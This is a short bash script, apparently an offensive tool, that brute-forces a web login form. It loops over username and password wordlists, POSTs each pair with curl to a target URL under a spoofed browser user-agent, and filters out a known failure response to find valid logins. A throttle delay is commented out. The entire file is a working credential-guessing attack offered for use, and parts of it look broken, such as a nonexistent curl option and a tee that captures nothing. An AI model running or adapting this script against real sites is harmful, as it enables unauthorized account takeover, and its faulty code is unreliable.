if [ "$1" == "-h" ]; then
  echo "./username_password-POST DOMAIN_NAME USERNAME_WORDLIST PASSWORD_WORDLIST UNWANTED_RESPONSE"
  exit 0
fi

# Customize user-agent
ua="Mozilla/5.0 (Windows NT 6.1; Win64,x64, rv:59.0) Gecko/20100101 Firefox/59.0"
# Read input wordlist line-by-line
while IFS= read -r password
do
	while IFS= read -r user
	do
		# Create post data
		data=$(echo "username= $user &password= $password &login=Login" | sed 's/ //g')
		# Get the response for the request with the post data
		response=$(curl -s --max-time 5 --max-limit 100K -A "$ua" -d "$data" "$1")
		# Filter out the common error response
		echo "$response" | egrep -q "$4" | tee username_password-POST.txt
		# sleep $(((RANDOM%5)+1))
	done < "$2"
done < "$3"